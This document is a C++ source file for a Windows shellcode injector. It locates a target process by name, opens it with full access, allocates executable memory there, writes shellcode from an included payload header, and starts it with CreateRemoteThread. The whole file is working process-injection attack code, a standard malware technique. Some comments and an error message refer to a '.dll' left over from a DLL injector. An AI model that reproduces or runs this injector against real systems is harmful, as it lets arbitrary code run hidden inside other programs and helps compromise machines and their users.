/**
* Injects shellcode into a process
* Supports 32- and 64 Bit applications.
* [Warning] - The current implementation crashes the target process after executing the shellcode
*/

#include <Windows.h>
#include <string>
#include <cstdio>
#include <tlhelp32.h>

#include "../payload/shellcode.hpp"


int main(int argc, char* argv[])
{
	const char* processName;

	if (argc != 2)
	{
		printf("Usage: *.exe processName\n");
		return 1;
	}

	processName = argv[1];

	printf("[Info] - Injecting shellcode into %s\n", processName);

	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
	if (processesSnapshot == INVALID_HANDLE_VALUE)
	{
		printf("Error %d - Failed to CreateToolhelp32Snapshot\n", GetLastError());
		return 1;
	}

	// get first process of snapshot
	PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
	if (!Process32First(processesSnapshot, &processEntry))
	{
		printf("Error %d - Failed to Process32First\n", GetLastError());
		return 1;
	}

	bool foundTargetProcess = false;

	// iterate processes
	do
	{
		// check if we found the target process
		if (strcmpi(processEntry.szExeFile, processName) == 0)
		{
			foundTargetProcess = true;
			break;
		}
	} while (Process32Next(processesSnapshot, &processEntry));

	if (!foundTargetProcess)
	{
		printf("Error - Failed to find process: %s\n", processName);
		return 1;
	}

	printf("[Info] - Found Process %s with pid %d\n", processName, processEntry.th32ProcessID);

	// acquire a handle to the target process
	HANDLE targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, processEntry.th32ProcessID);
	if (!targetProcessHandle)
	{
		printf("Error %d - Failed to acquire process handle\n", GetLastError());
		return 1;
	}

	printf("[Info] - Acquired process handle %p\n", targetProcessHandle);

	// allocate memory in the target process
	LPVOID remoteMemory = VirtualAllocEx(targetProcessHandle, nullptr, MAX_PATH, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!remoteMemory)
	{
		printf("Error %d - Failed to allocate memory in target process\n", GetLastError());
		return 1;
	}

	printf("[Info] - Allocated remote memory at %p\n", remoteMemory);

	// write shellcode into target process
	if (!WriteProcessMemory(targetProcessHandle, remoteMemory, shellcode, sizeof(shellcode) - 1, NULL))
	{
		printf("Error %d - Failed to write .dll path to target process\n", GetLastError());
		return 1;
	}

	printf("[Info] - Wrote payload to %p\n", remoteMemory);

	// create a thread in the target process which loads the .dll
	HANDLE hThread = CreateRemoteThread(
		targetProcessHandle,
		nullptr,
		NULL,
		reinterpret_cast<LPTHREAD_START_ROUTINE>(remoteMemory),
		NULL,
		NULL,
		nullptr
	);

	if (!hThread)
	{
		printf("Error %d - Failed to CreateRemoteThread\n", GetLastError());
		return 1;
	}

	printf("[Info] - Created remote thread. Executing %p\n", remoteMemory);

	CloseHandle(hThread);
}